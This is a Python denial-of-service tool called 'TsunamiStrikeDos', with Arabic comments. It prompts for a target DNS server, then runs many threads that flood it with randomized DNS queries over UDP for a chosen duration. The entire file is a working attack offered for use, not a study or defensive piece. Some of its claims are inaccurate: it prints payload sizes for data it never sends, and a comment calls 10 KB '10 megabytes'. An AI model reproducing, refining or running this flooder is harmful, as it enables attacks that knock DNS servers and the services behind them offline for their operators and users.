import socket
import random
import threading
import time
import string
from colorama import Fore as F

from concurrent.futures import ThreadPoolExecutor

__version__ = '4.0.6 BETA'
print(f'''
{F.GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                {F.CYAN} TsunamiStrikeDos V{F.GREEN}  {__version__}{F.RESET}
''')

# دالة لتوليد اسم نطاق مزيف عشوائي
def generate_random_domain():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(5, 15))) + ".com"

# دالة لتوليد IP وهمي (إن كنت ترغب في التزوير)
def generate_fake_ip():
    return ".".join(map(str, (random.randint(1, 255) for _ in range(4))))

# دالة لتوليد Payload عشوائي بحجم محدد
def buildBlock(size):
    block = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(size))
    return block

# هجوم DNS
def dns_flood(target_ip, target_port, duration, stop_event, proxies):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # استخدام UDP لأن DNS يعتمد عليه
    end_time = time.time() + duration
    while not stop_event.is_set() and time.time() < end_time:
        domain = generate_random_domain()
        query_type = random.choice([b"\x00\x01", b"\x00\x1c", b"\x00\x0f"])  # A, AAAA, MX
        payload = buildBlock(1024 * 10)  # 10 ميغابايت

        request = (
            b"\xAA\xAA"  # ID
            b"\x01\x00"  # Flags
            b"\x00\x01"  # Number of questions
            b"\x00\x00"  # Number of answers
            b"\x00\x00"  # Number of authority records
            b"\x00\x00"  # Number of additional records
        )
        for part in domain.split("."):
            request += bytes([len(part)]) + part.encode("utf-8")
        request += b"\x00"
        request += query_type  # استخدام نوع استعلام عشوائي
        request += b"\x00\x01"  # Query class: IN

        # إرسال الطلب إلى خادم DNS المستهدف
        sock.sendto(request, (target_ip, target_port))
        print(f"{F.CYAN}Request sent!{F.RESET} | Fake domain: {F.GREEN}{domain}{F.RESET} | Payload size: {len(payload)} bytes")
        
        time.sleep(random.uniform(0.05, 0.2))  # تعديل الوقت بين كل طلب بشكل عشوائي

# تشغيل الهجوم عبر عدة threads باستخدام ThreadPoolExecutor
def start_dns_flooding(target_ip, target_port, thread_count, duration, proxies):
    stop_event = threading.Event()  # متغير للتحكم في إنهاء الهجوم
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(dns_flood, target_ip, target_port, duration, stop_event, proxies)

    # بعد انتهاء المدة نوقف الهجوم
    time.sleep(sleeptime)
    stop_event.set()  # توقف جميع الـ threads
    print(f"{F.CYAN}( DONE ) {F.GREEN}Attack finished after {duration} seconds.{F.RESET}")

if __name__ == "__main__":
    target_ip = input(f"{F.CYAN}(?){F.RESET} Target IP DNS: {F.GREEN}")
    target_port = int(input(f"{F.CYAN}(?){F.RESET} Target port (default 53): {F.GREEN}") or 53)
    num_threads = int(input(f"{F.CYAN}(?){F.RESET} Threads: {F.GREEN}"))
    duration = int(input(f"{F.CYAN}(?){F.RESET} Attack duration (seconds): {F.GREEN}"))
    sleeptime = int(input(f"{F.CYAN}(?) {F.RESET}Sleep: {F.GREEN}"))

    start_dns_flooding(target_ip, target_port, num_threads, duration, None)
